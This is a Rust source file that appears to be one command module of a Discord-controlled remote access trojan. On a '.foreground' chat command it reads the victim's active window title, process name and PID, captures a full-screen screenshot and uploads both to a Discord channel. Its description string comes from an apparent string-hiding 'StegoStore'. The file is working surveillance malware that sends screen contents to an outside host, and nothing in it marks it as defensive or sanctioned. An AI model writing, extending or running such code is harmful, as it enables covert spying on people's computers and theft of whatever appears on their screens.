use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;


use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId};
use winapi::shared::minwindef::DWORD;
use sysinfo::{System, SystemExt, Pid, PidExt, ProcessExt};

pub struct ForegroundCommand;

#[async_trait]
impl BotCommand for ForegroundCommand {
    fn name(&self) -> &str { "foreground" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "FOREGROUND").into_boxed_str())
    }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".foreground" }
    fn examples(&self) -> &'static [&'static str] {
        &[".foreground"]
    }
    fn aliases(&self) -> &'static [&'static str] { &["fg", "active"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        unsafe {
            let hwnd = GetForegroundWindow();
            if hwnd.is_null() {
                http.create_message(msg.channel_id.get(), "**Error**: No foreground window found").await?;
                return Ok(());
            }
            //  title
            let mut title: [u16; 512] = [0; 512];
            let len = GetWindowTextW(hwnd, title.as_mut_ptr(), title.len() as i32);
            let window_title = if len > 0 {
                String::from_utf16_lossy(&title[..len as usize])
            } else {
                "Unknown".to_string()
            };
            // process ID
            let mut process_id: DWORD = 0;
            GetWindowThreadProcessId(hwnd, &mut process_id);
            // process name using sysinfo
            let mut system = System::new_all();
            system.refresh_all();
            let process_name = if let Some(process) = system.process(Pid::from_u32(process_id)) {
                process.name().to_string()
            } else {
                "Unknown".to_string()
            };
            // screenshot
            let screenshot = screenshots::Screen::all().unwrap().first().unwrap().capture().unwrap();
            let png_data = screenshot.buffer().to_vec();

            let info = format!(
                "**Foreground Window**\n\n\
                **Title**: {}\n\
                **Process**: {} (PID: {})\n\
                **Handle**: 0x{:X}",
                window_title, process_name, process_id, hwnd as usize
            );
            
            http.create_message_with_file(
                msg.channel_id.into(),
                &info,
                &png_data,
                "foreground.png"
            ).await?;
        }

        Ok(())
    }
}


